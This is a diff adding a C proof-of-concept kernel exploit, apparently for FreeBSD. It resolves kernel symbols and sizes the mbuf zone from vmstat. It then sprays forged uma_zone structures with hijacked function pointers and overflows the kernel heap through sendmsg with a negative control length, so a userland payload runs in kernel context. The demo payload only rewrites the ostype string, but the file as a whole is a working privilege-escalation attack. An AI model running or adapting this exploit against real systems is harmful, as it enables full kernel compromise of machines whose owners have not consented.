@@ -1,0 +1,159 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/param.h>
+#include <sys/linker.h>
+
+void *(*ata_get_xport)(void);
+int (*kprintf)(const char *fmt, ...);
+char *ostype;
+
+void *resolve(char *name) {
+	struct kld_sym_lookup ksym;
+	
+	ksym.version = sizeof(ksym);
+	ksym.symname = name;
+	
+	if(kldsym(0, KLDSYM_LOOKUP, &ksym) < 0) {
+		perror("kldsym");
+		exit(1);
+	}
+	
+	printf("  [+] Resolved %s to %#lx\n", ksym.symname, ksym.symvalue);
+	return (void *)ksym.symvalue;
+}
+
+void dummy(void) { 
+}
+
+void payload(void) {
+	kprintf("  [+] Entered kernel payload\n");
+	
+	strcpy(ostype, "CTurt  ");
+}
+
+#define INFO_SIZE 0
+#define INFO_LIMIT 1
+#define INFO_USED 2
+#define INFO_FREE 3
+#define INFO_REQ 4
+#define INFO_FAIL 5
+
+int getZoneInfo(char *zname, int i) {
+	#define BUF_SIZE 256
+	#define LINE_SIZE 56
+	
+	unsigned int info[6] = { 0 };
+	FILE *fp = NULL;
+	char buf[BUF_SIZE];
+	char iname[LINE_SIZE];
+	
+	fp = popen("/usr/bin/vmstat -z", "r");
+	
+	if(fp == NULL) {
+		perror("popen");
+		exit(1);
+	}
+	
+	memset(buf, 0, sizeof(buf));
+	memset(iname, 0, sizeof(iname));
+	
+	while(fgets(buf, sizeof(buf) - 1, fp) != NULL) {
+		sscanf(buf, "%s %u, %u, %u, %u, %u, %u\n", iname, &info[INFO_SIZE], &info[INFO_LIMIT],
+			&info[INFO_USED], &info[INFO_FREE], &info[INFO_REQ], &info[INFO_FAIL]);
+		
+		if(strncmp(iname, zname, strlen(zname)) == 0 && iname[strlen(zname)] == ':') {
+			break;
+		}
+	}
+	
+	pclose(fp);
+	return info[i];
+}
+
+void craftCorruptedZone(void *zone) {
+	void **uz_slab = (void **)(zone + 200);
+	void **uz_dtor = (void **)(zone + 216);
+	void **uz_fini = (void **)(zone + 232);
+	void **uz_import = (void **)(zone + 240);
+	void **uz_release = (void **)(zone + 248);
+	*uz_slab = dummy;
+	*uz_fini = payload;
+	*uz_import = dummy;
+	*uz_release = dummy;
+}
+
+void craftZone(void *zone) {
+	void **uz_slab = (void **)(zone + 200);
+	void **uz_dtor = (void **)(zone + 216);
+	void **uz_fini = (void **)(zone + 232);
+	void **uz_import = (void **)(zone + 240);
+	void **uz_release = (void **)(zone + 248);
+	
+	// put valid kernel address
+	*uz_slab = ata_get_xport;
+	*uz_fini = ata_get_xport;
+	*uz_import = ata_get_xport;
+	*uz_release = ata_get_xport;
+}
+
+int main(void) {
+	int sock;
+	struct msghdr msg;
+	
+	ata_get_xport = resolve("ata_get_xport");
+	kprintf = resolve("printf");
+	ostype = resolve("ostype");
+	
+	const int previousAllocations = getZoneInfo("mbuf", INFO_USED);
+	
+	const size_t bufferSize = getZoneInfo("mbuf", INFO_SIZE);
+	const size_t overflowSize = previousAllocations * bufferSize + 0x4000;
+	
+	char *mapping, *buffer, *overflow;
+	const size_t copySize = bufferSize + overflowSize;
+	const size_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
+	
+	mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	munmap(mapping + mappingSize, PAGE_SIZE);
+	
+	buffer = mapping + mappingSize - copySize;
+	overflow = buffer + bufferSize;
+	
+	memset(overflow, 0, overflowSize);
+	
+	// sizeof(struct uma_zone) == 0x300, but since we can't be certain exactly where we overflow from, we will craft at 256 byte intervals
+	for(size_t i = previousAllocations * bufferSize + 0xe0; i < overflowSize - 256; i += 256) {
+		craftCorruptedZone(overflow + i);
+	}
+	
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_control = buffer;
+	msg.msg_controllen = -1;
+	
+	printf("  [+] Performing overflow\n");
+	sendmsg(sock, &msg, 0);
+	
+	printf("  [+] Triggering payload\n");
+	close(sock);
+	
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	
+	for(size_t i = previousAllocations * bufferSize + 0xe0; i < overflowSize - 256; i += 256) {
+		craftZone(overflow + i);
+	}
+	
+	printf("  [+] Performing overflow\n");
+	sendmsg(sock, &msg, 0);
+	
+	munmap(mapping, mappingSize);
+	
+	return 0;
+}
